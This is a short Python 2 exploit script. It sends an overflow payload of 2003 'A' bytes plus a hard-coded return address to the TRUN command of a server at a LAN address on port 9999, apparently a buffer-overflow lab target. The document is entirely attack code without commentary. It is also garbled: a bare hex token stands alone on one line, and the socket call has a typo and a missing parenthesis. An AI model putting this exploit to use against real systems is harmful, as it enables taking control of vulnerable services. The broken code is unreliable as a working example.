#!/usr/bin/python

import sys, socket

625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
# input pointer

try:
    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM
    s.connect(('192.168.1.90',9999))
    s.send(('TRUN //.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
